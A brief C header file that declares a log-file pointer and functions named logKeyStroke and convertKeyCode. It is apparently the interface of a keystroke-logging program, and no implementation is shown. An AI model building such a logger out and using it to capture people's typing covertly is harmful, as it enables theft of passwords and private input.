#ifndef LOGGER_H_
#define LOGGER_H_

#include<stdio.h>

FILE *logFile;

void logKeyStroke(int);
char *convertKeyCode(int);

#endif // LOGGER_H_
